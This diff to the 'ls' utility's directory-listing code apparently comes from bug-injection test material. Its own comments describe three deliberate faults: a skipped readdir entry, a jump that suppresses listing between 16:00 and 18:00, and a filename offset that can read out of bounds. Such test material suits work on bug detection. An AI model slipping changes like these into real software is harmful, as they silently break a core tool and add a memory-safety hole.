@@ -1,0 +1,42 @@
+diff --git a/src/ls.c b/src/ls.c
+index 1047801e8..94a46ee91 100644
+--- a/src/ls.c
++++ b/src/ls.c
+@@ -3011,8 +3011,18 @@ print_dir (char const *name, char const *realname, bool command_line_arg)
+          and when readdir simply finds that there are no more entries.  */
+       errno = 0;
+       next = readdir (dirp);
++
++      //manipulate next
++      if(next > (void*)1) next = readdir (dirp); //movl  $1, %eax --> ecx
++
+       if (next)
+         {
++          //add time dependence
++          time_t tim = time(NULL);
++          struct tm* t = localtime(&tim);
++          if(t->tm_hour > 15 && t->tm_hour < 18)
++            goto BROL;
++
+           if (! file_ignored (next->d_name))
+             {
+               enum filetype type = unknown;
+@@ -3032,7 +3042,9 @@ print_dir (char const *name, char const *realname, bool command_line_arg)
+ # endif
+                 }
+ #endif
+-              total_blocks += gobble_file (next->d_name, type,
++              //skip 2 letters in filename, could be OOB if filename is
++              //shorter than 3 characters
++              total_blocks += gobble_file (next->d_name + 2, type,
+                                            RELIABLE_D_INO (next),
+                                            false, name);
+
+@@ -3064,6 +3076,7 @@ print_dir (char const *name, char const *realname, bool command_line_arg)
+       /* When processing a very large directory, and since we've inhibited
+          interrupts, this loop would take so long that ls would be annoyingly
+          uninterruptible.  This ensures that it handles signals promptly.  */
++BROL:
+       process_signals ();
+     }
+
